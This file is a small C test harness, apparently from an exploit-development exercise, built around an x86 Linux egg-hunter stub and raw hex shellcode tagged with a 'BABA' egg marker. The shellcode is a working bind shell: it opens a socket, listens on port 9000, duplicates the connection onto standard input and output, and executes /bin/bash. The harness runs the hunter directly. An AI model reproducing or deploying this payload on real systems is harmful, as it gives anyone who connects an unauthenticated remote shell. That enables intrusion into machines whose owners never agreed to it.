#include<stdio.h>
#include<string.h>
 
#define EGG "\x42\x41\x42\x41"
 
unsigned char shellcode[] = EGG
                            EGG
                            "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x51\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";
unsigned char egghunter[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xbb\x42\x41\x42\x41\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
void
main() {
  
    printf("Shellcode Length: %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    printf("\n Location found @ %x\n",ret);
    ret();
  
}
